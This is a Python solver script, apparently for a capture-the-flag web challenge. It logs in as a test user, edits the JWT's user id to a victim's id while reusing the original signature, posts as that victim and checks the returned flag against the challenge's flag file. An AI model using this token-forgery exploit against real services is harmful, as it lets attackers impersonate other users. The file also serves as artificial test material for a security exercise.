#!/usr/bin/env python3

import requests, json, os
import jwt
import argparse

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--count')
    parser.add_argument('--domain', default='localhost:8000')
    parser.add_argument(
        '--protocol',
        default='https',
        choices=['https', 'http']
    )
    args = parser.parse_args()
    return args


args = parse()


domain = args.domain
url = f"{args.protocol}://{domain}"
user_to_attack_id = 5
flag_file = f"{SCRIPT_DIR}/../challenge/flag"

# LOGIN

headers = {
    'authority': domain,
    'accept': 'application/json, text/plain, /',
    'accept-language': 'en-GB,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'dnt': '1',
    'origin': url,
    'pragma': 'no-cache',
    'referer': f"{url}/login",
    'sec-ch-ua': '"Brave";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
}

json_data = {
    'username': 'kowalski',
    'password': '12345',
}
response = requests.post(f"{url}/api/login", headers=headers, json=json_data)

print(response)

# Payload with forged jwt token

jwt_token = json.loads(response.text)['token']
jwt_token_signature = jwt_token.split('.')[2]

payload = dict(jwt.decode(jwt_token, 'HS256', verify=False))
payload['userid'] = user_to_attack_id

payload_encoded = jwt.encode(payload, '')
payload_encoded = ".".join(payload_encoded.decode("utf-8").split('.')[0:2])

# change user_id, but copy signature from current valid token
forged_jwt_token = f"{payload_encoded}.{jwt_token_signature}"


headers = {
    'authority': domain,
    'accept': 'application/json, text/plain, /',
    'accept-language': 'en-GB,en;q=0.5',
    'authorization': f"Bearer {forged_jwt_token}",
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'dnt': '1',
    'origin': url,
    'pragma': 'no-cache',
    'referer': f"{url}/profile/{user_to_attack_id}/",
    'sec-ch-ua': '"Brave";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
}

json_data = {
    'message': 'I_HAVE_PWNED_THIS_PLATFORM',
}

response = requests.post(f"{url}/api/users/{user_to_attack_id}/posts", headers=headers, json=json_data)
flag = json.loads(response.text)["winner_flag"].replace('\n', '')

print(response.text)

with open(flag_file, 'r') as f:
    correct_flag = f.readlines()[0].strip()

    if flag == correct_flag:
        print("Correct flag!")
        exit(0)
    else:
        print("No / incorrect flag")
        exit(1)
